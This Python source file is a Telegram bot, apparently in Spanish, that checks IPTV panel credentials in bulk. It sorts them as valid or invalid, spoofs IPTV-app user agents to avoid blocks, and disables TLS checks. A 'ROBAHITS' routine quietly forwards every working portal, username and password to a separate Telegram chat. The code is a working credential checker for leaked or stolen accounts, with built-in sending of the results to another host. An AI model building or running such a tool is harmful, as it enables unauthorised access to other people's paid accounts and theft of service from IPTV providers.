#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🦂 IPTV BOT ULTRA PRO — BY LUIS R 🦂
Verificación HIT / FAIL / RETRY — Rápida, paralela y precisa
"""

import os, re, json, time, threading, logging, socket, asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import pytz
import requests

from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes
)
from telegram.constants import ParseMode

# ══════════════════════════════════════════
#  CONFIG — Variables de entorno en Railway
# ══════════════════════════════════════════
BOT_TOKEN    = os.getenv("BOT_TOKEN", "")
ADMIN_ID     = int(os.getenv("ADMIN_ID", "0"))
RENDER_URL   = os.getenv("RENDER_URL", "")
# Token del bot donde quieres recibir los HITs (tu bot personal)
ROBAHITS_TOKEN  = os.getenv("ROBAHITS_TOKEN", "")
# Tu chat_id personal donde recibirás las notificaciones de HITs
ROBAHITS_CHATID = os.getenv("ROBAHITS_CHATID", "")
# Zona horaria: cambia según tu país. Ej: "America/Mexico_City", "America/Bogota"
TZ = pytz.timezone(os.getenv("TZ_NAME", "America/Mexico_City"))

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)
requests.packages.urllib3.disable_warnings()

bot_active     = True
BOT_START_TIME = datetime.now(TZ)
STATS = {"checks": 0, "hits": 0, "fails": 0, "retries": 0, "users": set()}

LINE = "━" * 26

FLAGS = {
    "US":"🇺🇸","MX":"🇲🇽","ES":"🇪🇸","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱",
    "PE":"🇵🇪","VE":"🇻🇪","BR":"🇧🇷","EC":"🇪🇨","UY":"🇺🇾","BO":"🇧🇴",
    "PA":"🇵🇦","DO":"🇩🇴","GT":"🇬🇹","CR":"🇨🇷","GB":"🇬🇧","DE":"🇩🇪",
    "FR":"🇫🇷","NL":"🇳🇱","CA":"🇨🇦","IT":"🇮🇹","PT":"🇵🇹","RU":"🇷🇺",
    "TR":"🇹🇷","IN":"🇮🇳","CN":"🇨🇳","JP":"🇯🇵","AU":"🇦🇺","SV":"🇸🇻",
    "HN":"🇭🇳","NI":"🇳🇮","PY":"🇵🇾","CU":"🇨🇺",
}

# Solo 2 UAs principales para velocidad — los más aceptados por servidores IPTV
USER_AGENTS = [
    "VLC/3.0.18 LibVLC/3.0.18",
    "Kodi/19.4 (Windows NT 10.0; Win64; x64) Kodi/19.4",
    "TiviMate/4.4.0 (Android 11)",
    "IPTV Smarters Pro/3.0.9.4 (Android 10)",
    "okhttp/4.9.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
]

def now_str():
    """Hora local correcta según TZ configurada."""
    return datetime.now(TZ).strftime("%Y-%m-%d %H:%M:%S")

def ts_to_date(epoch):
    """Convierte epoch a fecha legible en la zona horaria correcta."""
    try:
        v = int(epoch)
        if v > 0:
            return datetime.fromtimestamp(v, tz=TZ).strftime("%d/%m/%Y %H:%M")
    except Exception:
        pass
    return "Sin fecha"

# ══════════════════════════════════════════
#  EXTRACCIÓN DE URL
# ══════════════════════════════════════════

def extract_from_url(text: str):
    """Extrae portal, usuario y contraseña de cualquier formato IPTV."""
    patterns = [
        r'(?:https?://)?([^/\s]+)/get\.php\?username=([^&\s]+)&(?:amp;)?password=([^&\s\n]+)',
        r'(?:https?://)?([^/\s]+)/player_api\.php\?username=([^&\s]+)&(?:amp;)?password=([^&\s\n]+)',
        r'(?:https?://)?([^/\s]+)/playlist/([^/\s]+)/([^/\s\n]+)',
        r'(?:https?://)?([^/\s]+)/c/[^/]*/([^/\s]+)/([^/\s\n]+)',
        r'(?:https?://)?([^/\s]+)/live/([^/\s]+)/([^/\s\n]+)/',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            # Limpiar parámetros extra del password
            pwd = m.group(3).split('&')[0].split('\n')[0].strip()
            return m.group(1), m.group(2), pwd
    if '|' in text:
        parts = [x.strip() for x in text.split('|')]
        if len(parts) >= 3 and parts[0]:
            return parts[0], parts[1], parts[2]
    parts = text.split()
    if len(parts) == 3 and ':' in parts[0]:
        return parts[0], parts[1], parts[2]
    return None, None, None

# ══════════════════════════════════════════
#  VERIFICACIÓN — RÁPIDA Y PARALELA
# ══════════════════════════════════════════

def _parse_json(raw: str):
    """Parsea JSON tolerando basura al inicio."""
    raw = raw.strip()
    try:
        return json.loads(raw)
    except Exception:
        pass
    for ch in ('{', '['):
        idx = raw.find(ch)
        if idx >= 0:
            try:
                return json.loads(raw[idx:])
            except Exception:
                pass
    return None


def _analyze(data) -> tuple:
    """Analiza el JSON IPTV y devuelve (resultado, payload)."""
    if not isinstance(data, dict):
        return "RETRY", None

    # Buscar user_info — algunos servidores lo mandan directo
    ui = data.get("user_info", None)
    if ui is None:
        # Intentar auth directo en el root
        if "auth" in data:
            ui = data
        else:
            return "RETRY", None

    auth = ui.get("auth")
    if auth is None:
        return "RETRY", None
    try:
        auth = int(auth)
    except Exception:
        return "RETRY", None

    if auth == 0:
        return "FAIL", None

    if auth == 1:
        real_ui = data.get("user_info", ui)
        payload = {
            "user_info":   real_ui,
            "server_info": data.get("server_info", {}),
        }
        status = real_ui.get("status", "")
        if status == "Active":
            return "HIT", payload
        else:
            return "CUSTOM", payload

    return "RETRY", None


def _single_request(url: str, ua: str, timeout: int = 10) -> tuple:
    """
    Hace una sola petición y devuelve (resultado, payload).
    timeout reducido a 10s para mayor velocidad.
    """
    try:
        r = requests.get(
            url,
            headers={
                "User-Agent":    ua,
                "Accept":        "*/*",
                "Connection":    "keep-alive",
                "Cache-Control": "no-cache",
            },
            timeout=timeout,
            verify=False,
            allow_redirects=True,
        )
    except Exception as e:
        log.debug(f"Req error: {e}")
        return "RETRY", None

    log.info(f"HTTP {r.status_code} | {url[:50]}")

    if r.status_code not in (200, 206):
        return "RETRY", None

    raw = r.text.strip()

    # Bloqueo HTML / Cloudflare
    if raw.startswith("<") or "cloudflare" in raw.lower():
        return "RETRY", None

    # M3U directo = cuenta activa
    if raw.startswith("#EXTM3U") or raw.startswith("#EXT-X-"):
        return "HIT", {
            "user_info": {
                "auth": 1, "status": "Active",
                "exp_date": "0", "active_cons": "?",
                "max_connections": "?", "is_trial": "0", "created_at": "0",
            },
            "server_info": {}, "m3u_direct": True,
        }

    data = _parse_json(raw)
    if data is None:
        return "RETRY", None

    return _analyze(data)


def verify_account(portal: str, user: str, pwd: str) -> tuple:
    """
    Verificación paralela y rápida:
    - Test TCP primero (fail-fast si el server no responde)
    - Lanza peticiones en paralelo: http+https × player_api + get.php
    - Primera respuesta no-RETRY gana
    """
    host = portal.split(':')[0]
    port = int(portal.split(':')[1]) if ':' in portal else 8080

    # ── Test TCP rápido (5s máximo) ───────────────────────────────────────
    tcp_ok = False
    for p in (port, 443, 80):
        try:
            s = socket.create_connection((host, p), timeout=5)
            s.close()
            tcp_ok = True
            break
        except Exception:
            pass

    if not tcp_ok:
        log.warning(f"TCP FAIL {host} → RETRY directo")
        return "RETRY", None

    # ── Construir combinaciones a probar en paralelo ──────────────────────
    tasks = []
    for scheme in ("http", "https"):
        tasks.append((
            f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}",
            USER_AGENTS[0]
        ))
        tasks.append((
            f"{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus",
            USER_AGENTS[0]
        ))
    # Segunda ronda con UA alternativo por si el primero está bloqueado
    tasks.append((
        f"http://{portal}/player_api.php?username={user}&password={pwd}",
        USER_AGENTS[2]
    ))

    # ── Ejecutar en paralelo (máx 5 workers) ─────────────────────────────
    with ThreadPoolExecutor(max_workers=5) as ex:
        futures = {ex.submit(_single_request, url, ua, 10): (url, ua)
                   for url, ua in tasks}
        for fut in as_completed(futures, timeout=30):
            try:
                result, payload = fut.result()
                if result != "RETRY":
                    # Cancelar el resto (best-effort)
                    for f in futures:
                        f.cancel()
                    return result, payload
            except Exception as e:
                log.debug(f"Future error: {e}")

    return "RETRY", None

# ══════════════════════════════════════════
#  DATOS ADICIONALES (paralelos también)
# ══════════════════════════════════════════

def _count_action(portal, user, pwd, action):
    try:
        r = requests.get(
            f"http://{portal}/player_api.php?username={user}&password={pwd}&action={action}",
            headers={"User-Agent": USER_AGENTS[0]},
            timeout=12, verify=False
        )
        if r.status_code == 200:
            d = r.json()
            return str(len(d)) if isinstance(d, list) else "0"
    except Exception:
        pass
    return "N/D"


def get_content_counts(portal, user, pwd):
    """Obtiene Live/VOD/Series en paralelo."""
    results = {"live": "N/D", "vod": "N/D", "series": "N/D"}
    actions = [
        ("get_live_streams", "live"),
        ("get_vod_streams",  "vod"),
        ("get_series",       "series"),
    ]
    with ThreadPoolExecutor(max_workers=3) as ex:
        futs = {ex.submit(_count_action, portal, user, pwd, a): k for a, k in actions}
        for fut in as_completed(futs, timeout=20):
            key = futs[fut]
            try:
                results[key] = fut.result()
            except Exception:
                pass
    return results["live"], results["vod"], results["series"]


def get_categories(portal, user, pwd, limit=20):
    """Obtiene categorías con conteo de canales."""
    try:
        r = requests.get(
            f"http://{portal}/player_api.php?username={user}&password={pwd}&action=get_live_categories",
            headers={"User-Agent": USER_AGENTS[0]}, timeout=12, verify=False
        )
        if r.status_code != 200:
            return ""
        cats = r.json()
        if not isinstance(cats, list) or not cats:
            return ""

        # Conteo por categoría
        count_map = {}
        try:
            r2 = requests.get(
                f"http://{portal}/player_api.php?username={user}&password={pwd}&action=get_live_streams",
                headers={"User-Agent": USER_AGENTS[0]}, timeout=15, verify=False
            )
            if r2.status_code == 200:
                for ch in r2.json():
                    cid = str(ch.get("category_id", ""))
                    count_map[cid] = count_map.get(cid, 0) + 1
        except Exception:
            pass

        lines = []
        for c in cats[:limit]:
            name = c.get("category_name", "").replace("\\/", "/").strip()
            cid  = str(c.get("category_id", ""))
            if not name:
                continue
            cnt = f" [{count_map[cid]}]" if cid in count_map else ""
            lines.append(f"  ➠ {name}{cnt}")
        if len(cats) > limit:
            lines.append(f"  ➕ ...y {len(cats) - limit} categorías más")
        return "\n".join(lines)
    except Exception:
        return ""


def get_location(portal):
    try:
        ip = portal.split(":")[0]
        r  = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            if d.get("status") == "success":
                country = d.get("country", "?")
                code    = d.get("countryCode", "")
                return f"{country} {FLAGS.get(code, '🌍')}"
    except Exception:
        pass
    return "Desconocido 🌍"

# ══════════════════════════════════════════
#  ROBAHITS — Reenvío de HITs al admin
# ══════════════════════════════════════════

def send_robahit(portal, user, pwd, ui, live, vod, series):
    """Envía el HIT a tu bot/chat personal en background."""
    if not ROBAHITS_TOKEN or not ROBAHITS_CHATID:
        return
    try:
        expire = ts_to_date(ui.get("exp_date", 0))
        m3u    = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
        text   = (
            f"🦂 <b>ROBO HIT — LUIS R</b> 🦂\n\n"
            f"🌐 Portal: <code>{portal}</code>\n"
            f"👤 Usuario: <code>{user}</code>\n"
            f"🔑 Pass: <code>{pwd}</code>\n"
            f"⏲ Vence: {expire}\n"
            f"📺 Live: {live} | 🎥 VOD: {vod} | 📹 Series: {series}\n"
            f'🔗 <a href="{m3u}">M3U Link</a>\n\n'
            f"🕐 {now_str()}"
        )
        requests.post(
            f"https://api.telegram.org/bot{ROBAHITS_TOKEN}/sendMessage",
            json={"chat_id": ROBAHITS_CHATID, "text": text,
                  "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=8
        )
    except Exception as e:
        log.warning(f"RobaHit send error: {e}")

# ══════════════════════════════════════════
#  TARJETAS DE RESULTADO
# ══════════════════════════════════════════

def card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user):
    expire  = ts_to_date(ui.get("exp_date", 0))
    created = ts_to_date(ui.get("created_at", 0))
    active  = ui.get("active_cons", "?")
    maxcon  = ui.get("max_connections", "?")
    status  = ui.get("status", "Active")
    trial   = "No Trial" if str(ui.get("is_trial","0")) in ("0","false","") else "✅ Trial"
    location = get_location(portal)
    m3u = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
    epg = f"http://{portal}/xmltv.php?username={user}&password={pwd}"

    t  = f"{LINE}\n"
    t += f"🦂 <b>LUIS R</b> 🦂\n"
    t += f"  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n"
    t += f"{LINE}\n"
    t += f"➥ 🟢 CUENTA VÁLIDA\n"
    t += f"➥ 🆙 Estado: ✅ {status.upper()}\n"
    t += f"➥ 🧪 Trial: {trial}\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"➥ 🔑 Contraseña: <code>{pwd}</code>\n"
    t += f"➥ 📅 Creada: {created}\n"
    t += f"➥ ⏲ Vence: {expire}\n"
    t += f"➥ 👁 Conexiones: {active} / {maxcon}\n"
    t += f"➥ 📍 País: {location}\n"
    t += f"{LINE}\n"
    t += f"     ★彡ᴄᴏɴᴛᴇɴᴛ彡★\n"
    t += f"{LINE}\n"
    t += f"➥ 📺 En Vivo: {live}\n"
    t += f"➥ 🎥 VOD: {vod}\n"
    t += f"➥ 📹 Series: {series}\n"
    t += f"{LINE}\n"
    t += f'➥ 🔗 <a href="{m3u}">M3U Link</a>   |   <a href="{epg}">EPG Link</a>\n'
    if cats:
        t += f"{LINE}\n"
        t += f"   ★彡ᴄᴀᴛᴇɢᴏʀíᴀs彡★\n"
        t += f"{LINE}\n"
        t += f"{cats}\n"
    t += f"{LINE}\n"
    t += f"   ✔️ Verificado para @{tg_user}\n"
    t += f"   🕐 {now_str()}\n"
    t += f"{LINE}"
    return t


def card_custom(portal, user, pwd, ui, tg_user):
    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
    t += f"➥ 🟡 CUENTA EXISTE — NO ACTIVA\n"
    t += f"➥ 🆙 Estado: ⚠️ {ui.get('status','?').upper()}\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"➥ 🔑 Contraseña: <code>{pwd}</code>\n"
    t += f"➥ ⏲ Vence: {ts_to_date(ui.get('exp_date',0))}\n"
    t += f"➥ 👥 Max: {ui.get('max_connections','?')}\n"
    t += f"{LINE}\n   ✔️ Verificado para @{tg_user}\n"
    t += f"   🕐 {now_str()}\n{LINE}"
    return t


def card_fail(portal, user, tg_user):
    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
    t += f"➥ 🔴 CUENTA INVÁLIDA\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"{LINE}\n   ❌ Credenciales incorrectas (auth=0)\n"
    t += f"   ✔️ Verificado para @{tg_user}\n"
    t += f"   🕐 {now_str()}\n{LINE}"
    return t


def card_retry(portal, user, tg_user):
    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
    t += f"➥ 🔄 SIN RESPUESTA / RETRY\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"{LINE}\n   ⚠️ Servidor bloqueado o caído\n"
    t += f"   💡 Intenta más tarde\n"
    t += f"   ✔️ Verificado para @{tg_user}\n"
    t += f"   🕐 {now_str()}\n{LINE}"
    return t

# ══════════════════════════════════════════
#  KEEP-ALIVE 24/7
# ══════════════════════════════════════════

def keep_alive():
    if not RENDER_URL:
        return
    while True:
        try:
            requests.get(RENDER_URL, timeout=8)
            log.info("Keep-alive ✅")
        except Exception:
            pass
        time.sleep(480)

# ══════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════

def is_admin(u: Update) -> bool:
    return u.effective_user.id == ADMIN_ID

def tg_name(u: Update) -> str:
    usr = u.effective_user
    return usr.username or usr.first_name or str(usr.id)

# ══════════════════════════════════════════
#  LÓGICA CENTRAL
# ══════════════════════════════════════════

async def do_check(update: Update, portal: str, user: str, pwd: str):
    if not bot_active:
        return
    STATS["checks"] += 1
    STATS["users"].add(update.effective_user.id)
    tg_user = tg_name(update)

    msg = await update.message.reply_text("🔍 Verificando cuenta…")

    loop = asyncio.get_event_loop()
    status, result = await loop.run_in_executor(None, verify_account, portal, user, pwd)

    if status == "HIT":
        STATS["hits"] += 1
        await msg.edit_text("📡 Obteniendo contenido…")
        ui = result["user_info"]

        # Contenido y categorías en paralelo
        live_fut  = loop.run_in_executor(None, get_content_counts, portal, user, pwd)
        cats_fut  = loop.run_in_executor(None, get_categories, portal, user, pwd)
        live, vod, series = await live_fut
        cats              = await cats_fut

        text = card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user)
        await msg.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

        # Enviar robaHit en background sin bloquear
        threading.Thread(
            target=send_robahit,
            args=(portal, user, pwd, ui, live, vod, series),
            daemon=True
        ).start()

    elif status == "CUSTOM":
        STATS["hits"] += 1
        ui = result["user_info"]
        await msg.edit_text(card_custom(portal, user, pwd, ui, tg_user),
                            parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    elif status == "FAIL":
        STATS["fails"] += 1
        await msg.edit_text(card_fail(portal, user, tg_user), parse_mode=ParseMode.HTML)

    else:
        STATS["retries"] += 1
        await msg.edit_text(card_retry(portal, user, tg_user), parse_mode=ParseMode.HTML)

# ══════════════════════════════════════════
#  COMANDOS TELEGRAM
# ══════════════════════════════════════════

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("❌ No autorizado.")
        return
    global bot_active
    bot_active = True
    await update.message.reply_text(
        "🦂 <b>IPTV BOT ULTRA PRO — LUIS R</b> 🦂\n\n"
        "🟢 Bot <b>ACTIVADO</b>\n\n"
        "📌 <b>Pega la URL directamente:</b>\n"
        "<code>http://portal:8080/get.php?username=USER&amp;password=PASS</code>\n\n"
        "📌 <b>O usa el comando:</b>\n"
        "<code>/check portal:puerto usuario contraseña</code>\n\n"
        "⚡ Verificación paralela ultra rápida\n"
        "🦂 BY LUIS R — 24/7",
        parse_mode=ParseMode.HTML
    )


async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("❌ No autorizado.")
        return
    global bot_active
    bot_active = False
    await update.message.reply_text(
        "🔴 <b>Bot DETENIDO.</b>\nUsa /start para reactivarlo.\n🦂 BY LUIS R",
        parse_mode=ParseMode.HTML
    )


async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        await update.message.reply_text("❌ No autorizado.")
        return
    uptime = datetime.now(TZ) - BOT_START_TIME
    h, rem = divmod(int(uptime.total_seconds()), 3600)
    m, s   = divmod(rem, 60)
    estado = "🟢 ACTIVO" if bot_active else "🔴 DETENIDO"
    robahit_status = "✅ Activo" if (ROBAHITS_TOKEN and ROBAHITS_CHATID) else "❌ No configurado"
    await update.message.reply_text(
        f"🦂 <b>ESTADO — LUIS R</b> 🦂\n\n"
        f"📺 Bot: {estado}\n"
        f"⏰ Uptime: {h:02d}h {m:02d}m {s:02d}s\n"
        f"🕐 Hora actual: {now_str()}\n\n"
        f"✅ Hits: {STATS['hits']}\n"
        f"❌ Fails: {STATS['fails']}\n"
        f"🔄 Retries: {STATS['retries']}\n"
        f"⭐ Total: {STATS['checks']}\n"
        f"👥 Usuarios: {len(STATS['users'])}\n\n"
        f"🔔 RobaHits: {robahit_status}\n\n"
        f"🦂 BY LUIS R",
        parse_mode=ParseMode.HTML
    )


async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update) or not bot_active:
        return
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "📌 <b>Uso:</b> <code>/check portal:puerto usuario contraseña</code>\n"
            "🔥 <b>Ej:</b> <code>/check latinchannel.tv:8080 laura.cal cal130325</code>",
            parse_mode=ParseMode.HTML
        )
        return
    await do_check(update, args[0], args[1], args[2])


async def cmd_debug(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Diagnóstico completo — muestra exactamente qué responde el servidor."""
    if not is_admin(update):
        return
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "📌 <code>/debug portal:puerto usuario contraseña</code>",
            parse_mode=ParseMode.HTML
        )
        return
    portal, user, pwd = args[0], args[1], args[2]
    msg = await update.message.reply_text("🔬 Ejecutando diagnóstico…")
    host = portal.split(':')[0]
    port = int(portal.split(':')[1]) if ':' in portal else 8080
    lines = [f"🔬 <b>DIAGNÓSTICO</b> <code>{portal}</code>\n"]

    # TCP
    for p in (port, 443, 80):
        try:
            s = socket.create_connection((host, p), timeout=5)
            s.close()
            lines.append(f"🔌 TCP ✅ puerto {p}")
            break
        except Exception as e:
            lines.append(f"🔌 TCP ❌ puerto {p}: {str(e)[:50]}")
    lines.append("")

    for scheme in ("http", "https"):
        url = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
        lines.append(f"🔗 <b>{scheme.upper()}</b>")
        try:
            r = requests.get(url, headers={"User-Agent": USER_AGENTS[0]},
                             timeout=10, verify=False)
            lines.append(f"  Status: <code>{r.status_code}</code>")
            raw = (r.text.strip()[:400]
                   .replace("&", "&amp;")
                   .replace("<", "&lt;")
                   .replace(">", "&gt;"))
            lines.append(f"  Respuesta:\n<code>{raw}</code>")
        except requests.exceptions.ConnectionError:
            lines.append("  ❌ Conexión rechazada")
        except requests.exceptions.Timeout:
            lines.append("  ⏱ Timeout &gt;10s")
        except Exception as e:
            lines.append(f"  ❌ {str(e)[:80]}")
        lines.append("")

    await msg.edit_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🦂 <b>COMANDOS — LUIS R</b> 🦂\n\n"
        "/start — 🟢 Encender bot\n"
        "/stop  — 🔴 Apagar bot\n"
        "/status — 📊 Estado y estadísticas\n"
        "/check <code>portal user pass</code> — ✅ Verificar cuenta\n"
        "/debug <code>portal user pass</code> — 🔬 Diagnóstico\n"
        "/help  — ❓ Esta ayuda\n\n"
        "💡 También pega cualquier URL M3U directamente.\n\n"
        "🦂 BY LUIS R — ULTRA PRO",
        parse_mode=ParseMode.HTML
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Detecta URLs IPTV pegadas directamente."""
    if not is_admin(update) or not bot_active:
        return
    text = (update.message.text or "").strip()
    portal, user, pwd = extract_from_url(text)
    if portal and user and pwd:
        await do_check(update, portal, user, pwd)

# ══════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════

def main():
    if not BOT_TOKEN:
        log.error("❌ BOT_TOKEN no configurado. Agrégalo en Railway → Variables.")
        return

    threading.Thread(target=keep_alive, daemon=True).start()
    log.info("🦂 IPTV BOT ULTRA PRO — LUIS R — Iniciando…")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start",  cmd_start))
    app.add_handler(CommandHandler("stop",   cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("check",  cmd_check))
    app.add_handler(CommandHandler("debug",  cmd_debug))
    app.add_handler(CommandHandler("help",   cmd_help))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    log.info("✅ Bot listo — escuchando.")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
